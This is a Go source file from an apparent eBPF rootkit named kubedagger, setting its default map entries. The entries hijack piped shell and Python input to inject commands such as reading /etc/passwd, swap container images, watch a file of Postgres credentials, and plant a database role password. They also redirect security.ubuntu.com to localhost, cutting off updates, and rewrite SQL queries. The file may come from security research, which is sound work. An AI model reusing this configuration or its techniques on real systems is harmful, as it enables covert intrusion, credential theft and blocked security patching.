package kubedagger

import "github.com/cilium/ebpf"

func defaultCommProgKeys() []ebpf.MapKV {
	return []ebpf.MapKV{
		{
			Key: NewCommBuffer("cat", "python"),
			Value: CommProgKey{
				ProgKey: PipeOverridePythonKey,
				Backup:  0,
			},
		},
		{
			Key: NewCommBuffer("cat", "python3"),
			Value: CommProgKey{
				ProgKey: PipeOverridePythonKey,
				Backup:  0,
			},
		},
		{
			Key: NewCommBuffer("cat", "python3.8"),
			Value: CommProgKey{
				ProgKey: PipeOverridePythonKey,
				Backup:  0,
			},
		},
		{
			Key: NewCommBuffer("cat", "bash"),
			Value: CommProgKey{
				ProgKey: PipeOverrideShellKey,
				Backup:  1,
			},
		},
		{
			Key: NewCommBuffer("", "sh"),
			Value: CommProgKey{
				ProgKey: PipeOverrideShellKey,
				Backup:  1,
			},
		},
	}
}

func defaultPipedProgs() []ebpf.MapKV {
	return []ebpf.MapKV{
		{
			Key:   PipeOverridePythonKey,
			Value: NewPipedProgram("print('hello world')"),
		},
		{
			Key:   PipeOverrideShellKey,
			Value: NewPipedProgram("cat /etc/passwd; "),
		},
	}
}

func defaultImageOverrides() []ebpf.MapKV {
	return []ebpf.MapKV{
		{
			Key: ImageOverrideKey{
				Prefix: 6,
				Image:  NewDockerImage68("debian"),
			},
			Value: ImageOverride{
				Override:    DockerImageReplace,
				Ping:       PingNop,
				Prefix:     6,
				ReplaceWith: NewDockerImage64("ubuntu"),
			},
		},
	}
}

func defaultDedicatedWatchKeys() []ebpf.MapKV {
	return []ebpf.MapKV{
		{
			Key: uint32(0),
			Value: FSWatchKey{
				Flag:     uint8(0),
				Filepath: NewFSWatchFilepath("/kubedagger/images_list"),
			},
		},
		{
			Key: uint32(1),
			Value: FSWatchKey{
				Flag:     uint8(0),
				Filepath: NewFSWatchFilepath("/kubedagger/pg_credentials"),
			},
		},
		{
			Key: uint32(2),
			Value: FSWatchKey{
				Flag:     uint8(0),
				Filepath: NewFSWatchFilepath("/kubedagger/network_discovery"),
			},
		},
	}
}

func defaultPostgresRoles() []ebpf.MapKV {
	return []ebpf.MapKV{
		{
			Key:   MustEncodeRole("webapp"),
			Value: MustEncodeMD5("hello", "webapp"),
		},
	}
}

func defaultDNSTable() []ebpf.MapKV {
	return []ebpf.MapKV{
		{
			Key:   MustEncodeDNS("security.ubuntu.com"),
			Value: MustEncodeIPv4("127.0.0.1"),
		},
		{
			Key:   MustEncodeDNS("google.fr"),
			Value: MustEncodeIPv4("127.0.0.1"),
		},
		{
			Key:   MustEncodeDNS("facebook.com"),
			Value: MustEncodeIPv4("172.217.19.227"),
		},
	}
}

func defaultQueryOverridePatterns() []ebpf.MapKV {
	return []ebpf.MapKV{
		{
			Key:   []byte("SELECT * FROM product WHERE category='defcon'"),
			Value: []byte("SELECT * FROM product WHERE category='defconn"),
		},
	}
}
